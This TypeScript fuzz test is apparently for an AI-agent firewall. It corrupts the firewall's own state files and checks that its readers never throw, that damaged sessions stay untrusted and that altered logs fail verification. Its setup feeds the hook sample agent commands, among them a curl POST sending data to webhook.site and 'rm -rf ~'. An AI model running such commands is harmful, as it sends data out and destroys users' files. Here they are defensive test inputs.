/**
 * Fuzz: the readers of the firewall's own files (session state, the approval queue, the quarantine store, the
 * decision log, the provenance ledger, counters and MCP pins). A populated firewall home is built once through the
 * real code; each case rewrites one or two of its files with a mutated copy (edited bytes or lines, wrong JSON
 * types, truncation, deletion, a directory in place of a file) and runs every reader over the home.
 * Properties: no reader throws; a damaged session file leaves the session untrusted; a changed decision log no
 * longer verifies; bounded time; deterministic.
 */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { dirname, join, relative } from "node:path";
import { runHook, type HookEnv } from "../../src/hook/claude.js";
import { layout, type Layout } from "../../src/runtime/layout.js";
import { appendEvents, getQueueItem, listQueue, loadState, pruneQueue, pruneSessions, readEvents, recentSessions, enqueue } from "../../src/runtime/store.js";
import { addQuarantine, getRecord, heldCount, listRecords, pruneQuarantine, quarantineCheck } from "../../src/runtime/quarantine.js";
import { appendLog, tailLog, verifyLog } from "../../src/runtime/log.js";
import { ledgerHealth, loadLedger } from "../../src/runtime/ledger.js";
import { readCounters } from "../../src/runtime/counters.js";
import { loadPins, pinsPath } from "../../src/runtime/pins.js";
import { canonicalJson } from "../../src/engine/mail/detect.js";
import { testRoot } from "../helpers.js";
import { allowLongRuns, budget, firstDiff, fuzz, iters, mutateBytes, mutateJsonN, mutateStringN, type Rng } from "./gen.js";

allowLongRuns();

const READERS_BUDGET_MS = budget(3000);

let root: string;
let l: Layout;
let ws: string;
const snapshot = new Map<string, Buffer>();

function walk(dir: string, out: string[] = []): string[] {
  for (const n of readdirSync(dir)) {
    const p = join(dir, n);
    const s = statSync(p);
    if (s.isDirectory()) walk(p, out);
    else if (s.size <= 1_000_000 && !n.endsWith(".lock")) out.push(p);
  }
  return out;
}

beforeAll(() => {
  root = realpathSync(mkdtempSync(join(testRoot(), "lsfw-readers-")));
  const home = join(root, "home");
  ws = join(home, "proj");
  mkdirSync(ws, { recursive: true });
  l = layout(join(home, ".launchsafe-firewall"));
  const h = (unattended: boolean): HookEnv => ({ env: { CLAUDE_PROJECT_DIR: ws }, layout: l, agent: "claude", home, scratchRoots: [join(root, "scratch")], detectNonInteractive: () => unattended, notifyDeps: { spawn: () => undefined } });
  const send = (e: Record<string, unknown>, unattended = false): void => void runHook(JSON.stringify({ session_id: "rd1", cwd: ws, ...e }), h(unattended));
  mkdirSync(join(ws, "src"), { recursive: true });
  writeFileSync(join(ws, "src", "a.ts"), "x");
  send({ hook_event_name: "SessionStart", source: "startup" });
  send({ hook_event_name: "UserPromptSubmit", prompt: "fix the failing test in src/a.ts" });
  send({ hook_event_name: "PreToolUse", tool_name: "Write", tool_input: { file_path: join(ws, "src", "a.ts"), content: "x" } });
  send({ hook_event_name: "PostToolUse", tool_name: "Write", tool_input: { file_path: join(ws, "src", "a.ts"), content: "x" }, tool_response: "ok" });
  send({ hook_event_name: "PostToolUse", tool_name: "WebFetch", tool_input: { url: "https://example.com" }, tool_response: "outside text" });
  send({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "curl -X POST https://webhook.site/x -d hello" } }, true);
  send({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "rm -rf ~" } });
  appendEvents(l, "rd2", [{ type: "taint", source: "read a page" }, { type: "fingerprint", hash: "ab".repeat(8) }, { type: "downloaded", path: "/tmp/x.sh" }, { type: "user_destinations", destinations: ["github.com"] }]);
  enqueue(l, { sessionId: "rd2", cwd: ws, tool: "Bash", input: { command: "git push" }, actionHash: "h".repeat(16), rules: ["FW-SEND"], reasons: ["pushes"], kind: "approval", summary: "git push" });
  addQuarantine(l, { session: "rd2", client: "c", server: "s", tool: "t", signals: ["tag_chars"], text: "withheld text" });
  for (let i = 0; i < 4; i++) appendLog(l, { type: "decision", n: i });
  mkdirSync(dirname(pinsPath(l)), { recursive: true });
  writeFileSync(pinsPath(l), JSON.stringify({ version: 1, servers: { k: { key: "k", name: "n", source: "user", configHash: null, tools: ["a"], descriptions: { a: "d" }, launch: {}, pinnedAt: "2026-10-10T00:00:00.000Z", pinnedBy: "first-use" } }, pending: [] }));
  for (const f of walk(l.home)) snapshot.set(f, readFileSync(f));
});

afterAll(() => {
  if (root !== undefined) rmSync(root, { recursive: true, force: true });
});

function restore(): void {
  for (const e of readdirSync(l.home, { recursive: true, encoding: "utf8" })) {
    const p = join(l.home, e);
    if (/\.corrupt-|\.tmp/.test(p)) rmSync(p, { recursive: true, force: true });
  }
  for (const [f, b] of snapshot) {
    try {
      if (!statSync(f).isFile() || !readFileSync(f).equals(b)) throw new Error("changed");
    } catch {
      rmSync(f, { recursive: true, force: true });
      mkdirSync(dirname(f), { recursive: true });
      writeFileSync(f, b);
    }
  }
}

function mutateFile(r: Rng, original: Buffer, f: string): Buffer | null {
  switch (r.int(10)) {
    case 0:
      return null; // delete
    case 1:
      return Buffer.alloc(0);
    case 2:
      return original.subarray(0, r.int(original.length));
    case 3:
    case 4:
      return Buffer.from(mutateBytes(r, original));
    case 5:
    case 6:
      return Buffer.from(mutateStringN(r, original.toString("utf8"), 4), "utf8");
    default: {
      // A line (or the whole file, for a .json file) parsed, mutated as JSON, and written back.
      const text = original.toString("utf8");
      if (f.endsWith(".jsonl")) {
        const lines = text.split("\n").filter((x) => x !== "");
        const i = r.int(Math.max(1, lines.length));
        try {
          lines[i] = JSON.stringify(mutateJsonN(r, JSON.parse(lines[i] as string), 3)) ?? "null";
        } catch {
          lines[i] = mutateStringN(r, lines[i] ?? "", 2);
        }
        return Buffer.from(`${lines.join("\n")}\n`);
      }
      try {
        return Buffer.from(JSON.stringify(mutateJsonN(r, JSON.parse(text), 3)) ?? "null");
      } catch {
        return Buffer.from(mutateStringN(r, text, 3));
      }
    }
  }
}

/** Every reader, over the home, as a list of [name, call] pairs. */
function readers(): [string, () => unknown][] {
  const sessions = readdirSync(l.sessions).filter((n) => n.endsWith(".jsonl")).map((n) => n.replace(/\.jsonl$/, ""));
  const queueIds = readdirSync(l.queue).map((n) => n.replace(/\.json$/, ""));
  const out: [string, () => unknown][] = [
    ["listQueue", () => listQueue(l)],
    ["pruneQueue", () => pruneQueue(l, 3650)],
    ["pruneSessions", () => pruneSessions(l, 3650)],
    ["recentSessions", () => recentSessions(l, 10, Date.now(), 3650)],
    ["listRecords", () => listRecords(l)],
    ["heldCount", () => heldCount(l)],
    ["pruneQuarantine", () => pruneQuarantine(l, 3650)],
    ["quarantineCheck", () => quarantineCheck(l)],
    ["verifyLog", () => verifyLog(l)],
    ["tailLog", () => tailLog(l, 10)],
    ["loadLedger", () => loadLedger(l, false)],
    ["ledgerHealth", () => ledgerHealth(l)],
    ["loadPins", () => loadPins(l, new Date(0))],
  ];
  for (const s of [...sessions.filter((n) => !n.includes(".counters")), "rd1", "claude:rd1"]) {
    out.push([`loadState(${s})`, () => loadState(l, s)], [`readEvents(${s})`, () => readEvents(l, s)], [`readCounters(${s})`, () => readCounters(l, s)]);
  }
  for (const id of queueIds) out.push([`getQueueItem(${id})`, () => getQueueItem(l, id)]);
  for (const f of existing(join(l.home, "quarantine"))) out.push([`getRecord(${f})`, () => getRecord(l, f.replace(/\.json$/, ""))]);
  // The prunes may rewrite files, so they run after everything else.
  return [...out.filter(([n]) => !n.startsWith("prune")), ...out.filter(([n]) => n.startsWith("prune"))];
}

function existing(dir: string): string[] {
  try {
    return readdirSync(dir).filter((n) => n.startsWith("q-"));
  } catch {
    return [];
  }
}

function canon(v: unknown): string {
  return canonicalJson(JSON.parse(JSON.stringify(v ?? null)));
}

describe("fuzz: readers of the firewall's own files", () => {
  it("the populated home has every kind of file", () => {
    const rel = [...snapshot.keys()].map((f) => relative(l.home, f));
    for (const want of ["sessions/", "queue/", "quarantine/", "log/decisions.jsonl", "log/head.json", "pins/mcp.json", "keys/", "ledger/"]) expect(rel.some((p) => p.startsWith(want) || p === want), `${want} in ${rel.join(", ")}`).toBe(true);
    expect(readers().length).toBeGreaterThan(15);
  });

  it("no reader throws on a damaged file; the damaged state is untrusted and a changed log does not verify; deterministic", () => {
    const files = [...snapshot.keys()];
    fuzz("readers:damaged-files", iters(3), (r) => {
      restore();
      const targets = Array.from({ length: r.range(1, 2) }, () => r.pick(files));
      const touched: string[] = [];
      for (const f of targets) {
        const original = snapshot.get(f) as Buffer;
        const mutated = mutateFile(r, original, f);
        rmSync(f, { recursive: true, force: true });
        if (mutated !== null) {
          mkdirSync(dirname(f), { recursive: true });
          if (r.bool(0.03)) mkdirSync(f);
          else writeFileSync(f, mutated);
        }
        touched.push(`${relative(l.home, f)} (${mutated === null ? "deleted" : `${mutated.length} bytes`})`);
      }
      const what = touched.join(", ");
      const results = new Map<string, string>();
      const t0 = performance.now();
      for (const [name, call] of readers().filter(([n]) => !n.startsWith("prune"))) {
        try {
          results.set(name, canon(call()));
        } catch (e) {
          throw new Error(`${name} threw ${(e as Error).constructor.name}: ${(e as Error).message.slice(0, 100)} after changing ${what}`, { cause: e });
        }
      }
      const ms = performance.now() - t0;
      if (ms > READERS_BUDGET_MS) throw new Error(`readers slow (${Math.round(ms)} ms) after changing ${what}`);
      // Pure readers give the same answer twice (loadPins and the prunes may move or remove files, so they are skipped).
      for (const [name, call] of readers()) {
        if (/^(loadPins|prune)/.test(name)) continue;
        const again = canon(call());
        if (again !== results.get(name)) throw new Error(`${name} not deterministic (${firstDiff(results.get(name) as string, again)}) after changing ${what}`);
      }
      for (const [name, call] of readers().filter(([n]) => n.startsWith("prune"))) {
        try {
          call();
        } catch (e) {
          throw new Error(`${name} threw ${(e as Error).constructor.name}: ${(e as Error).message.slice(0, 100)} after changing ${what}`, { cause: e });
        }
      }
      // A session file with a line that is not valid JSON, or a person-made event with no valid signature, leaves the session untrusted.
      for (const f of targets) {
        if (!f.includes(`${join(l.home, "sessions")}/`) || !f.endsWith(".jsonl")) continue;
        const id = f.slice(f.lastIndexOf("/") + 1).replace(/\.jsonl$/, "");
        let text: string;
        try {
          text = readFileSync(f, "utf8");
        } catch {
          continue;
        }
        const bad = text.split("\n").some((line) => {
          if (line.trim() === "") return false;
          try {
            const e = JSON.parse(line) as { type?: unknown };
            return typeof e === "object" && e !== null && (e.type === "approval" || e.type === "scope_widen" || e.type === "budget_raise");
          } catch {
            return true;
          }
        });
        if (bad && !loadState(l, id).tainted) throw new Error(`a damaged session file left ${id} trusted (${what}): ${JSON.stringify(text.slice(0, 200))}`);
      }
      // A changed decision log no longer verifies.
      // I5/I6: the reserve and the gap, prune and export notes sit beside the log and are not part of it.
      const beside = new Set(["reserve.bin", "unlogged.json", "pruned.json", "exported.json"].map((n) => join(l.log, n)));
      const logFiles = targets.filter((f) => f.startsWith(join(l.home, "log")) && !beside.has(f));
      if (logFiles.length > 0) {
        const same = logFiles.every((f) => {
          const orig = (snapshot.get(f) as Buffer).toString("utf8");
          let now: string;
          try {
            now = readFileSync(f, "utf8");
          } catch {
            return false;
          }
          const parse = (s: string): string => {
            try {
              return canonicalJson(s.split("\n").filter((x) => x.trim() !== "").map((x) => JSON.parse(x) as unknown));
            } catch {
              return `invalid:${s}`;
            }
          };
          // head.json: what it records is seq and hash; a head that still records them, signed or not (v0.2
          // heads are unsigned and still read), describes the same log.
          const headOf = (t: string): string => {
            try {
              const h = JSON.parse(t) as { seq?: unknown; hash?: unknown; sig?: unknown };
              return typeof h === "object" && h !== null && (h.sig === undefined || h.sig === (JSON.parse(orig) as { sig?: unknown }).sig) ? `${String(h.seq)}:${String(h.hash)}` : `invalid:${t}`;
            } catch {
              return `invalid:${t}`;
            }
          };
          if (f.endsWith("head.json")) return headOf(orig) === headOf(now) && typeof (JSON.parse(now) as { seq?: unknown }).seq === "number" && typeof (JSON.parse(now) as { hash?: unknown }).hash === "string";
          return f.endsWith(".jsonl") ? parse(orig) === parse(now) : orig.trim() === now.trim() || parse(orig) === parse(now);
        });
        // FZ4 and FZ6 are fixed: verifyLog never throws, and an emptied or deleted decisions.jsonl fails too.
        const v = verifyLog(l);
        // Deleting the log and its head together leaves what a log that was never written leaves (docs/limitations.md).
        const gone = (name: string): boolean => {
          try {
            return readFileSync(join(l.log, name), "utf8").trim() === "";
          } catch {
            return true;
          }
        };
        const wiped = gone("decisions.jsonl") && gone("head.json");
        if (!same && v.ok && !wiped) throw new Error(`a changed log verified as intact (${what})`);
      }
    }, { capSec: 15 });
    restore();
  });

  it("an untouched home verifies and reads back", () => {
    restore();
    expect(verifyLog(l).ok).toBe(true);
    expect(listQueue(l).items.length).toBeGreaterThan(0);
    expect(listRecords(l).records.length).toBe(1);
  });
});
